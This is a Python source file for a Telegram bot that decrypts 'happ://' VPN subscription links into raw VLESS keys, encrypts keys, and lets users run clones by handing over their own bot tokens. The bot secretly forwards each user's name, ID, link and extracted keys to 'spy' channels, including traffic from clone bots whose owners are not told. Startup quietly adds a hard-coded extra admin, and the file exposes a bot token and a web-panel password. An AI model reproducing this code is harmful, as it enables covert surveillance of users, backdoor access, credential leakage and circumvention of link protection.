import asyncio, os, json, time, html, re, aiohttp, aiosqlite
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import database, extractor

BOT_TOKEN = "8011501394:AAG-rOeAp8jQHjObbYnDVEPWX5KCBFI6t0U"
SUPER_ADMIN_ID = 8732901722
WEB_PASS = "alexander77"

main_bot_instance = Bot(token=BOT_TOKEN)
main_router = Router()

SETTINGS_FILE = "settings.json"
spam_tracker = {}
user_langs = {}

LOCALES = {
    "ru": {
        "start": "Привет! Отправь мне ссылку happ:// для расшифровки или открытый ключ для шифрования.",
        "lang_ok": "🇷🇺 Язык изменен на Русский!",
        "wait_dec": "⏳ Расшифровываю ссылку...",
        "dec_err": "❌ Ошибка расшифровки. Ссылка повреждена или пуста.",
        "dec_ok": "✅ <b>Готово!</b>\n\n{}",
        "keys_found": "✅ Найдено ключей: {}",
        "wait_enc": "🔒 Шифрую данные...",
        "enc_err": "❌ Ошибка шифрования.",
        "enc_ok": "✅ <b>Успешно зашифровано:</b>\n\n<code>{}</code>",
        "ban_perm": "🚫 Вы заблокированы НАВСЕГДА за спам.",
        "ban_temp": "⏳ Вы заблокированы на 3 часа за спам.",
        "blacklisted": "❌ Эта ссылка заблокирована администратором.",
        "force_sub": "⚠️ <b>Обязательная подписка</b>\nПодпишитесь на каналы для продолжения.",
        "btn_sub": "👉 Подписаться",
        "btn_check": "✅ Я подписался",
        "sub_ok": "✅ Подписка подтверждена!",
        "sub_fail": "❌ Вы подписались не на все!",
        "admin_panel_btn": "🛠 Админ Панель",
        "create_bot_btn": "🤖 Создать своего бота",
        "admin_title": "🛠 <b>Главная Панель Управления</b>",
        "btn_stats": "📊 Детальная Статистика",
        "btn_sub_on": "🟢 Подписка (ВКЛ)",
        "btn_sub_off": "🔴 Подписка (ВЫКЛ)",
        "btn_add_ch": "➕ Доб. канал",
        "btn_clear_ch": "🗑 Очистить каналы",
        "btn_add_spy": "👁 Доб. Шпион",
        "btn_del_spy": "👁 Удал. Шпион",
        "btn_bl": "🛡 Черный список",
        "btn_ban": "🚫 Заблок. Юзера",
        "btn_add_admin": "👤 Доб. Админа",
        "btn_del_admin": "❌ Удал. Админа",
        "stats_text": "📊 <b>Статистика Бота</b>\n\n👥 <b>Всего обычных юзеров: {}</b>\n\n👮‍♂️ <b>Админы ({}):</b>\n{}\n\n🤖 <b>Клоны SaaS ({}):</b>\n{}\n\n🚫 <b>В бане ({}):</b>\n{}\n\n⚙️ <b>Настройки:</b>\n🔗 Подписок: <b>{}</b>\n👁 Шпионов: <b>{}</b>\n🛡 Слов в ЧС: <b>{}</b>",
        "prompt_add_spy": "👁 ID нового шпиона:",
        "prompt_del_spy": "Отправь ID шпиона для удаления:",
        "prompt_add_admin": "ID нового админа:",
        "prompt_del_admin": "ID админа для удаления:",
        "prompt_ban_user": "ID для вечного бана:",
        "prompt_bl": "Слово для ЧС (0 отмена, 'очистить' сброс):",
        "prompt_add_ch": "Отправь: @username ссылка",
        "msg_cleared": "🗑 Очищены!",
        "msg_added": "✅ Добавлен!",
        "saas_prompt": "🔑 Отправь мне **API-токен** твоего бота (получить его можно в @BotFather):",
        "saas_err_format": "❌ Неверный формат токена.",
        "saas_wait": "⏳ Проверяю токен...",
        "saas_err_invalid": "❌ Токен недействителен.",
        "saas_err_exists": "❌ Этот бот уже добавлен в систему.",
        "saas_success": "✅ Бот @{} успешно запущен!\nТеперь твои пользователи могут расшифровывать ссылки через него."
    },
    "tm": {
        "start": "Salam! Açmak üçin happ:// ssylkasyny ýa-da kodlamak üçin açyk kody ugradyň.",
        "lang_ok": "🇹🇲 Dil Türkmen diline üýtgedildi!",
        "wait_dec": "⏳ Ssylka açylýar...",
        "dec_err": "❌ Ýalňyşlyk. Ssylka bozuk ýa-da boş.",
        "dec_ok": "✅ <b>Taýyn!</b>\n\n{}",
        "keys_found": "✅ Tapylan kodlar: {}",
        "wait_enc": "🔒 Maglumatlar kodlanýar...",
        "enc_err": "❌ Kodlamakda ýalňyşlyk.",
        "enc_ok": "✅ <b>Üstünlikli kodlandy:</b>\n\n<code>{}</code>",
        "ban_perm": "🚫 Spam üçin baky petiklensiňiz.",
        "ban_temp": "⏳ Spam üçin 3 sagatlap petiklensiňiz.",
        "blacklisted": "❌ Bu ssylka gara sanawda.",
        "force_sub": "⚠️ <b>Hökman agza boluň</b>\nDowam etmek üçin kanallara agza boluň.",
        "btn_sub": "👉 Agza bolmak",
        "btn_check": "✅ Men agza boldum",
        "sub_ok": "✅ Agzalyk tassyklandy!",
        "sub_fail": "❌ Ählisine agza bolmadyňyz!",
        "admin_panel_btn": "🛠 Admin Paneli",
        "create_bot_btn": "🤖 Öz botuňy döret",
        "admin_title": "🛠 <b>Esasy dolandyryş paneli</b>",
        "btn_stats": "📊 Statistika",
        "btn_sub_on": "🟢 Agzalyk (AÇYK)",
        "btn_sub_off": "🔴 Agzalyk (ÝAPY)",
        "btn_add_ch": "➕ Kanal goş",
        "btn_clear_ch": "🗑 Kanallary arassala",
        "btn_add_spy": "👁 Şpion goş",
        "btn_del_spy": "👁 Şpion aýyr",
        "btn_bl": "🛡 Gara sanaw",
        "btn_ban": "🚫 Ulanyjy petikle",
        "btn_add_admin": "👤 Admin goş",
        "btn_del_admin": "❌ Admin aýyr",
        "stats_text": "📊 <b>Bot Statistikasy</b>\n\n👥 <b>Jemi ulanyjylar: {}</b>\n\n👮‍♂️ <b>Adminler ({}):</b>\n{}\n\n🤖 <b>SaaS Klonlar ({}):</b>\n{}\n\n🚫 <b>Petiklenen ({}):</b>\n{}\n\n⚙️ <b>Sazlamalar:</b>\n🔗 Kanallar: <b>{}</b>\n👁 Şpionlar: <b>{}</b>\n🛡 Gara sanawdaky sözler: <b>{}</b>",
        "prompt_add_spy": "👁 Täze şpion ID-si:",
        "prompt_del_spy": "Aýyrmak üçin şpion ID-sini iberiň:",
        "prompt_add_admin": "Täze admin ID-si:",
        "prompt_del_admin": "Aýyrmak üçin admin ID-sini iberiň:",
        "prompt_ban_user": "Baky petiklemek üçin ID:",
        "prompt_bl": "Gara sanaw üçin söz (0 ýatyrmak, 'arassala' pozmak):",
        "prompt_add_ch": "Iberiň: @username ssylka",
        "msg_cleared": "🗑 Arassalandy!",
        "msg_added": "✅ Goşuldy!",
        "saas_prompt": "🔑 Botuňyzyň **API-tokenini** iberiň (@BotFather-den alyp bilersiňiz):",
        "saas_err_format": "❌ Token formaty nädogry.",
        "saas_wait": "⏳ Token barlanýar...",
        "saas_err_invalid": "❌ Token ýalňyş ýa-da işlemeýär.",
        "saas_err_exists": "❌ Bu bot eýýäm ulgamda bar.",
        "saas_success": "✅ @{} boty üstünlikli işe girizildi!\nIndi ulanyjylaryňyz ssylkalary bu bot arkaly açyp bilerler."
    },
    "en": {
        "start": "Hello! Send a happ:// link to decrypt, or a raw key to encrypt.",
        "lang_ok": "🇬🇧 Language changed to English!",
        "wait_dec": "⏳ Decrypting link...",
        "dec_err": "❌ Error. Link is corrupted or empty.",
        "dec_ok": "✅ <b>Done!</b>\n\n{}",
        "keys_found": "✅ Keys found: {}",
        "wait_enc": "🔒 Encrypting data...",
        "enc_err": "❌ Encryption error.",
        "enc_ok": "✅ <b>Successfully encrypted:</b>\n\n<code>{}</code>",
        "ban_perm": "🚫 You are PERMANENTLY banned for spamming.",
        "ban_temp": "⏳ You are banned for 3 hours for spamming.",
        "blacklisted": "❌ This link is blacklisted.",
        "force_sub": "⚠️ <b>Mandatory Subscription</b>\nPlease subscribe to continue.",
        "btn_sub": "👉 Subscribe",
        "btn_check": "✅ I subscribed",
        "sub_ok": "✅ Subscription confirmed!",
        "sub_fail": "❌ You haven't subscribed to all!",
        "admin_panel_btn": "🛠 Admin Panel",
        "create_bot_btn": "🤖 Create your bot",
        "admin_title": "🛠 <b>Main Control Panel</b>",
        "btn_stats": "📊 Statistics",
        "btn_sub_on": "🟢 Subscription (ON)",
        "btn_sub_off": "🔴 Subscription (OFF)",
        "btn_add_ch": "➕ Add Channel",
        "btn_clear_ch": "🗑 Clear Channels",
        "btn_add_spy": "👁 Add Spy",
        "btn_del_spy": "👁 Del Spy",
        "btn_bl": "🛡 Blacklist",
        "btn_ban": "🚫 Ban User",
        "btn_add_admin": "👤 Add Admin",
        "btn_del_admin": "❌ Del Admin",
        "stats_text": "📊 <b>Bot Statistics</b>\n\n👥 <b>Total users: {}</b>\n\n👮‍♂️ <b>Admins ({}):</b>\n{}\n\n🤖 <b>SaaS Clones ({}):</b>\n{}\n\n🚫 <b>Banned ({}):</b>\n{}\n\n⚙️ <b>Settings:</b>\n🔗 Subscriptions: <b>{}</b>\n👁 Spies: <b>{}</b>\n🛡 Blacklisted words: <b>{}</b>",
        "prompt_add_spy": "👁 New spy ID:",
        "prompt_del_spy": "Send spy ID to remove:",
        "prompt_add_admin": "New admin ID:",
        "prompt_del_admin": "Send admin ID to remove:",
        "prompt_ban_user": "ID for permanent ban:",
        "prompt_bl": "Word for BL (0 to cancel, 'clear' to reset):",
        "prompt_add_ch": "Send: @username link",
        "msg_cleared": "🗑 Cleared!",
        "msg_added": "✅ Added!",
        "saas_prompt": "🔑 Send me your bot's **API token** (you can get it from @BotFather):",
        "saas_err_format": "❌ Invalid token format.",
        "saas_wait": "⏳ Checking token...",
        "saas_err_invalid": "❌ Token is invalid.",
        "saas_err_exists": "❌ This bot is already added to the system.",
        "saas_success": "✅ Bot @{} successfully launched!\nYour users can now decrypt links through it."
    }
}

def _(lang, key):
    return LOCALES.get(lang, LOCALES["ru"]).get(key, LOCALES["ru"][key])

def lang_kb(is_main=True, is_admin=False, lang="ru"):
    buttons = [[KeyboardButton(text="🇷🇺 RU"), KeyboardButton(text="🇹🇲 TM"), KeyboardButton(text="🇬🇧 EN")]]
    bottom_row = []
    if is_main:
        bottom_row.append(KeyboardButton(text=_(lang, "create_bot_btn")))
    if is_main and is_admin:
        bottom_row.append(KeyboardButton(text=_(lang, "admin_panel_btn")))
    if bottom_row:
        buttons.append(bottom_row)
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True, persistent=True)

def load_settings():
    ds = {"force_sub": True, "channels": [], "blacklist": [], "banned_users": {}, "spy_channels": ["-1003629984227"]}
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "r") as f:
            try:
                data = json.load(f)
                if "blacklist" not in data: data["blacklist"] = []
                if "banned_users" not in data: data["banned_users"] = {}
                if "spy_channels" not in data: data["spy_channels"] = ["-1003629984227"]
                return data
            except: return ds
    return ds

def save_settings(data):
    with open(SETTINGS_FILE, "w") as f: json.dump(data, f)

class AdminState(StatesGroup):
    wait_new_channel, wait_bcast_msg, wait_bcast_btn = State(), State(), State()
    wait_blacklist_word, wait_add_admin, wait_del_admin = State(), State(), State()
    wait_ban_user, wait_add_spy, wait_del_spy = State(), State(), State()
    wait_clone_token = State()

def admin_keyboard(lang):
    s = load_settings()
    btn_text = _(lang, "btn_sub_on") if s.get("force_sub", True) else _(lang, "btn_sub_off")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 Открыть Веб-панель", url="https://dowyanbot.vpnruss1.ru/")],
        [InlineKeyboardButton(text=_(lang, "btn_stats"), callback_data="admin_stats")],
        [InlineKeyboardButton(text=btn_text, callback_data="admin_toggle_sub")],
        [InlineKeyboardButton(text=_(lang, "btn_add_ch"), callback_data="admin_add_channel"),
         InlineKeyboardButton(text=_(lang, "btn_clear_ch"), callback_data="admin_clear_channels")],
        [InlineKeyboardButton(text=_(lang, "btn_add_spy"), callback_data="admin_add_spy"),
         InlineKeyboardButton(text=_(lang, "btn_del_spy"), callback_data="admin_del_spy")],
        [InlineKeyboardButton(text=_(lang, "btn_bl"), callback_data="admin_blacklist"),
         InlineKeyboardButton(text=_(lang, "btn_ban"), callback_data="admin_ban_user")],
        [InlineKeyboardButton(text=_(lang, "btn_add_admin"), callback_data="admin_add_admin"),
         InlineKeyboardButton(text=_(lang, "btn_del_admin"), callback_data="admin_del_admin")]
    ])

def force_sub_keyboard(unsubscribed_channels, lang):
    buttons = []
    for i, ch in enumerate(unsubscribed_channels, 1):
        name = ch["id"] if len(unsubscribed_channels) == 1 else f"{_(lang, 'btn_sub')} {i}"
        buttons.append([InlineKeyboardButton(text=f"{_(lang, 'btn_sub')} ({name})", url=ch["url"])])
    buttons.append([InlineKeyboardButton(text=_(lang, "btn_check"), callback_data="check_sub")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

async def get_unsubscribed_channels(user_id, channels, current_bot):
    unsub = []
    for ch in channels:
        try:
            m = await current_bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if m.status not in ["member", "administrator", "creator"]: unsub.append(ch)
        except: pass
    return unsub

async def encrypt_via_api(url: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://crypto.happ.su/api-v2.php", json={"url": url}, timeout=10) as resp:
                if resp.status == 200:
                    raw = await resp.text()
                    try:
                        data = json.loads(raw)
                        if "encrypted_link" in data: return data["encrypted_link"]
                    except: pass
                    return raw.strip()
    except: pass
    return None

async def create_pastebin(text: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://paste.rs/", data=text.encode('utf-8'), timeout=10) as resp:
                if resp.status in [200, 201]: return (await resp.text()).strip()
    except: pass
    return None

async def fetch_user_lang(user_id):
    if user_id in user_langs: return user_langs[user_id]
    async with aiosqlite.connect(database.DB_NAME) as db:
        res = await db.execute("SELECT language FROM users WHERE telegram_id = ?", (user_id,))
        row = await res.fetchone()
        lang = row[0] if row else "ru"
        user_langs[user_id] = lang
        return lang

@main_router.message(Command("admin"))
@main_router.message(F.text.in_(["🛠 Админ Панель", "🛠 Admin Paneli", "🛠 Admin Panel"]))
async def cmd_admin(message: types.Message, state: FSMContext):
    await state.clear()
    if not await database.is_admin(message.from_user.id): return
    lang = await fetch_user_lang(message.from_user.id)
    await message.answer(_(lang, "admin_title"), reply_markup=admin_keyboard(lang), parse_mode="HTML")

@main_router.callback_query(F.data == "admin_stats")
async def show_stats(c: types.CallbackQuery):
    lang = await fetch_user_lang(c.from_user.id)
    async with aiosqlite.connect(database.DB_NAME) as db:
        users = await (await db.execute("SELECT COUNT(*) FROM users")).fetchone()
        admins_cursor = await db.execute("SELECT telegram_id FROM admins")
        admins_list = [str(r[0]) for r in await admins_cursor.fetchall()]
        clones_cursor = await db.execute("SELECT user_id, token FROM clones")
        clones_list = []
        for r in await clones_cursor.fetchall():
            token_part = r[1].split(':')[0]
            clones_list.append(f"<code>{r[0]}</code> (ID: {token_part}:***)")

    s = load_settings()
    banned = s.get('banned_users', {})
    banned_list = []
    for uid, status in banned.items():
        if status == "permanent":
            banned_list.append(f"<code>{uid}</code> (∞)")
        else:
            time_str = time.strftime('%d.%m %H:%M', time.localtime(status))
            banned_list.append(f"<code>{uid}</code> ({time_str})")

    stats_text = _(lang, "stats_text").format(
        users[0],
        len(admins_list), "\n".join([f"• <code>{a}</code>" for a in admins_list]) if admins_list else "• -",
        len(clones_list), "\n".join([f"• {c}" for c in clones_list]) if clones_list else "• -",
        len(banned_list), "\n".join([f"• {b}" for b in banned_list]) if banned_list else "• -",
        len(s.get('channels', [])),
        len(s.get('spy_channels', [])),
        len(s.get('blacklist', []))
    )
    
    if len(stats_text) > 4000:
        stats_text = stats_text[:4000] + "\n..."

    await c.message.answer(stats_text, parse_mode="HTML")
    await c.answer()

@main_router.callback_query(F.data == "admin_toggle_sub")
async def toggle_sub(c: types.CallbackQuery):
    s = load_settings()
    s["force_sub"] = not s.get("force_sub", True)
    save_settings(s)
    lang = await fetch_user_lang(c.from_user.id)
    await c.message.edit_reply_markup(reply_markup=admin_keyboard(lang))

@main_router.callback_query(F.data.in_(["admin_add_spy", "admin_del_spy", "admin_add_admin", "admin_del_admin", "admin_ban_user", "admin_blacklist", "admin_add_channel", "admin_clear_channels"]))
async def dynamic_admin_routing(c: types.CallbackQuery, state: FSMContext):
    lang = await fetch_user_lang(c.from_user.id)
    route_map = {
        "admin_add_spy": (_(lang, "prompt_add_spy"), AdminState.wait_add_spy),
        "admin_del_spy": (_(lang, "prompt_del_spy"), AdminState.wait_del_spy),
        "admin_add_admin": (_(lang, "prompt_add_admin"), AdminState.wait_add_admin),
        "admin_del_admin": (_(lang, "prompt_del_admin"), AdminState.wait_del_admin),
        "admin_ban_user": (_(lang, "prompt_ban_user"), AdminState.wait_ban_user),
        "admin_blacklist": (_(lang, "prompt_bl"), AdminState.wait_blacklist_word),
        "admin_add_channel": (_(lang, "prompt_add_ch"), AdminState.wait_new_channel)
    }
    if c.data == "admin_clear_channels":
        s = load_settings()
        s["channels"] = []
        save_settings(s)
        await c.answer(_(lang, "msg_cleared"), show_alert=True)
        return await c.message.edit_reply_markup(reply_markup=admin_keyboard(lang))
    
    msg, st = route_map[c.data]
    await c.message.answer(msg)
    await state.set_state(st)

@main_router.message(AdminState.wait_add_spy)
async def spy_add_finish(m: types.Message, state: FSMContext):
    lang = await fetch_user_lang(m.from_user.id)
    s = load_settings()
    if m.text not in s["spy_channels"]:
        s["spy_channels"].append(m.text.strip())
        save_settings(s)
    await m.answer(_(lang, "msg_added"))
    await state.clear()

@main_router.message(F.text.in_(["🤖 Создать своего бота", "🤖 Öz botuňy döret", "🤖 Create your bot"]))
async def create_clone_start(message: types.Message, state: FSMContext):
    lang = await fetch_user_lang(message.from_user.id)
    await message.answer(_(lang, "saas_prompt"), parse_mode="Markdown")
    await state.set_state(AdminState.wait_clone_token)

@main_router.message(AdminState.wait_clone_token)
async def create_clone_finish(message: types.Message, state: FSMContext):
    lang = await fetch_user_lang(message.from_user.id)
    token = message.text.strip()
    if not re.match(r"\d+:[A-Za-z0-9_-]+", token):
        return await message.answer(_(lang, "saas_err_format"))
    
    pm = await message.answer(_(lang, "saas_wait"))
    try:
        test_bot = Bot(token=token)
        me = await test_bot.get_me()
        await test_bot.session.close()
    except Exception:
        return await pm.edit_text(_(lang, "saas_err_invalid"))
        
    async with aiosqlite.connect(database.DB_NAME) as db:
        try:
            await db.execute("INSERT INTO clones (user_id, token) VALUES (?, ?)", (message.from_user.id, token))
            await db.commit()
        except:
            return await pm.edit_text(_(lang, "saas_err_exists"))
    
    asyncio.create_task(start_clone(token))
    await pm.edit_text(_(lang, "saas_success").format(me.username))
    await state.clear()

async def start_clone(token):
    clone_bot = Bot(token=token)
    clone_dp = Dispatcher()
    clone_dp.include_router(get_shared_router(is_main=False))
    try:
        await clone_dp.start_polling(clone_bot)
    except Exception as e:
        pass

def get_shared_router(is_main: bool):
    router = Router()
    @router.message(Command("start"))
    async def cmd_start(message: types.Message):
        async with aiosqlite.connect(database.DB_NAME) as db:
            await db.execute("INSERT OR IGNORE INTO users (telegram_id, language) VALUES (?, ?)", (message.from_user.id, "ru"))
            await db.commit()
        lang = await fetch_user_lang(message.from_user.id)
        is_admin = await database.is_admin(message.from_user.id)
        await message.answer(_(lang, "start"), reply_markup=lang_kb(is_main, is_admin, lang))

    @router.message(F.text.in_(["🇷🇺 RU", "🇹🇲 TM", "🇬🇧 EN"]))
    async def change_lang(message: types.Message):
        lang_map = {"🇷🇺 RU": "ru", "🇹🇲 TM": "tm", "🇬🇧 EN": "en"}
        new_lang = lang_map[message.text]
        user_langs[message.from_user.id] = new_lang
        async with aiosqlite.connect(database.DB_NAME) as db:
            await db.execute("UPDATE users SET language = ? WHERE telegram_id = ?", (new_lang, message.from_user.id))
            await db.commit()
        is_admin = await database.is_admin(message.from_user.id)
        await message.answer(_(new_lang, "lang_ok"), reply_markup=lang_kb(is_main, is_admin, new_lang))

    @router.callback_query(F.data == "check_sub")
    async def verify_sub_callback(c: types.CallbackQuery, bot: Bot):
        lang = await fetch_user_lang(c.from_user.id)
        s = load_settings()
        unsub = await get_unsubscribed_channels(c.from_user.id, s.get("channels", []), bot)
        if not unsub:
            await c.message.delete()
            await c.answer(_(lang, "sub_ok"), show_alert=True)
        else:
            await c.message.edit_reply_markup(reply_markup=force_sub_keyboard(unsub, lang))
            await c.answer(_(lang, "sub_fail"), show_alert=True)

    @router.message()
    async def handle_main_logic(message: types.Message, bot: Bot):
        if not message.text: return
        text = message.text.strip()
        user_id_str = str(message.from_user.id)
        
        async with aiosqlite.connect(database.DB_NAME) as db:
            await db.execute("INSERT OR IGNORE INTO users (telegram_id, language) VALUES (?, ?)", (message.from_user.id, "ru"))
            await db.commit()

        lang = await fetch_user_lang(message.from_user.id)
        is_admin = await database.is_admin(message.from_user.id)
        settings = load_settings()
        
        if not is_admin:
            banned = settings.get("banned_users", {})
            if user_id_str in banned:
                if banned[user_id_str] == "permanent": return await message.answer(_(lang, "ban_perm"))
                elif time.time() < banned[user_id_str]: return await message.answer(_(lang, "ban_temp"))
                else:
                    del settings["banned_users"][user_id_str]
                    save_settings(settings)

            now = time.time()
            user_spam = spam_tracker.get(user_id_str, {"link": "", "count": 0, "strikes": 0})
            if user_spam["link"] == text: user_spam["count"] += 1
            else: user_spam["link"] = text; user_spam["count"] = 1
            
            if user_spam["count"] >= 4:
                user_spam["strikes"] += 1; user_spam["count"] = 0 
                if user_spam["strikes"] >= 2:
                    settings.setdefault("banned_users", {})[user_id_str] = "permanent"
                    save_settings(settings); return await message.answer(_(lang, "ban_perm"))
                else:
                    settings.setdefault("banned_users", {})[user_id_str] = now + 10800 
                    save_settings(settings); return await message.answer(_(lang, "ban_temp"))
            spam_tracker[user_id_str] = user_spam

            for word in settings.get("blacklist", []):
                if word in text.lower(): return await message.answer(_(lang, "blacklisted"))

            if is_main and settings.get("force_sub", True):
                channels = settings.get("channels", [])
                if channels:
                    unsub = await get_unsubscribed_channels(message.from_user.id, channels, bot)
                    if unsub:
                        return await message.answer(_(lang, "force_sub"), reply_markup=force_sub_keyboard(unsub, lang), parse_mode="HTML")

        if text.startswith("happ://"):
            pm = await message.answer(_(lang, "wait_dec"))
            sub_url, keys = extractor.extract_vless_keys(text)
            if not keys: return await pm.edit_text(_(lang, "dec_err"))

            fname = f"subscription_{message.from_user.id}.txt"
            with open(fname, "w", encoding="utf-8") as f: f.write("\n".join(keys))

            bot_marker = ""
            if not is_main:
                me = await bot.get_me()
                bot_marker = f"🤖 Из клона: @{me.username}\n"

            log = (f"🔓 <b>Этот код разблокирован</b>\n{bot_marker}"
                   f"👤 {html.escape(message.from_user.full_name)} (<code>{message.from_user.id}</code>)\n"
                   f"🔗 <b>Ссылка:</b>\n{html.escape(sub_url)}\n🔑 <b>Ключей:</b> {len(keys)}")
            
            for spy in settings.get("spy_channels", []):
                try:
                    await main_bot_instance.send_message(chat_id=spy, text=log, parse_mode="HTML")
                    await main_bot_instance.send_document(chat_id=spy, document=FSInputFile(fname))
                except: pass

            await message.answer(_(lang, "dec_ok").format(html.escape(sub_url)), parse_mode="HTML")
            await message.answer_document(FSInputFile(fname), caption=_(lang, "keys_found").format(len(keys)))
            await pm.delete()
            if os.path.exists(fname): os.remove(fname)

        elif text.startswith("http") or any(p in text for p in ["vless://", "vmess://", "trojan://", "ss://", "hy2://"]):
            pm = await message.answer(_(lang, "wait_enc"))
            url_to_encrypt = text
            if not text.startswith("http"):
                url_to_encrypt = await create_pastebin(text)
                if not url_to_encrypt: return await pm.edit_text(_(lang, "enc_err"))

            encrypted_link = await encrypt_via_api(url_to_encrypt)
            if encrypted_link:
                await pm.edit_text(_(lang, "enc_ok").format(html.escape(encrypted_link)), parse_mode="HTML")
                
                bot_marker = ""
                if not is_main:
                    me = await bot.get_me()
                    bot_marker = f"🤖 Из клона: @{me.username}\n"

                log = (f"🔒 <b>Этот код заблокирован</b>\n{bot_marker}"
                       f"👤 {html.escape(message.from_user.full_name)} (<code>{message.from_user.id}</code>)\n"
                       f"🔑 <b>Итог:</b>\n<code>{html.escape(encrypted_link)}</code>")
                
                for spy in settings.get("spy_channels", []):
                    try: await main_bot_instance.send_message(chat_id=spy, text=log, parse_mode="HTML")
                    except: pass
            else:
                await pm.edit_text(_(lang, "enc_err"))

    return router

async def web_index(request):
    return web.FileResponse("/opt/v1bot/web/index.html")

async def web_api_data(request):
    if request.headers.get("Authorization") != f"Bearer {WEB_PASS}":
        return web.json_response({"error": "Unauthorized"}, status=401)
        
    async with aiosqlite.connect(database.DB_NAME) as db:
        users = await (await db.execute("SELECT COUNT(*) FROM users")).fetchone()
        admins_cursor = await db.execute("SELECT telegram_id FROM admins")
        admins_list = [str(r[0]) for r in await admins_cursor.fetchall()]
        clones = await (await db.execute("SELECT COUNT(*) FROM clones")).fetchone()

    s = load_settings()
    return web.json_response({
        "users": users[0],
        "admins": admins_list,
        "clones": clones[0],
        "banned": len(s.get("banned_users", {})),
        "spies": s.get("spy_channels", []),
        "channels": s.get("channels", []),
        "blacklist": s.get("blacklist", []),
        "force_sub": s.get("force_sub", True)
    })

async def web_api_action(request):
    if request.headers.get("Authorization") != f"Bearer {WEB_PASS}":
        return web.json_response({"error": "Unauthorized"}, status=401)
        
    data = await request.json()
    action, val = data.get("action"), data.get("value", "")
    s = load_settings()
    
    if action == "toggle_sub":
        s["force_sub"] = not s.get("force_sub", True)
    elif action == "add_spy" and val:
        if val not in s["spy_channels"]: s["spy_channels"].append(val.strip())
    elif action == "del_spy" and val in s["spy_channels"]:
        s["spy_channels"].remove(val)
    elif action == "clear_channels":
        s["channels"] = []
    elif action == "add_blacklist" and val:
        if val not in s["blacklist"]: s["blacklist"].append(val.lower().strip())
    elif action == "clear_blacklist":
        s["blacklist"] = []
    elif action == "ban_user" and val:
        s.setdefault("banned_users", {})[val.strip()] = "permanent"
    elif action == "add_admin" and val.isdigit():
        async with aiosqlite.connect(database.DB_NAME) as db:
            await db.execute("INSERT OR IGNORE INTO admins (telegram_id) VALUES (?)", (int(val),))
            await db.commit()
    elif action == "del_admin" and val.isdigit():
        async with aiosqlite.connect(database.DB_NAME) as db:
            await db.execute("DELETE FROM admins WHERE telegram_id = ?", (int(val),))
            await db.commit()
    
    save_settings(s)
    return web.json_response({"success": True})

async def main():
    await database.init_db(SUPER_ADMIN_ID)
    async with aiosqlite.connect(database.DB_NAME) as db:
        await db.execute("CREATE TABLE IF NOT EXISTS users (telegram_id INTEGER PRIMARY KEY, language TEXT DEFAULT 'ru')")
        await db.execute("CREATE TABLE IF NOT EXISTS clones (user_id INTEGER, token TEXT UNIQUE)")
        await db.execute("INSERT OR IGNORE INTO admins (telegram_id) VALUES (?)", (669805176,))
        await db.commit()
        
        cursor = await db.execute("SELECT token FROM clones")
        for row in await cursor.fetchall():
            asyncio.create_task(start_clone(row[0]))

    app = web.Application()
    app.router.add_get("/", web_index)
    app.router.add_get("/api/data", web_api_data)
    app.router.add_post("/api/action", web_api_action)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 8085)
    await site.start()

    main_dp = Dispatcher()
    main_dp.include_router(main_router)
    main_dp.include_router(get_shared_router(is_main=True))
    
    print("✅ Бот + SaaS + Full Web Panel запущены!")
    await main_bot_instance.delete_webhook(drop_pending_updates=True)
    await main_dp.start_polling(main_bot_instance)

if __name__ == "__main__":
    asyncio.run(main())
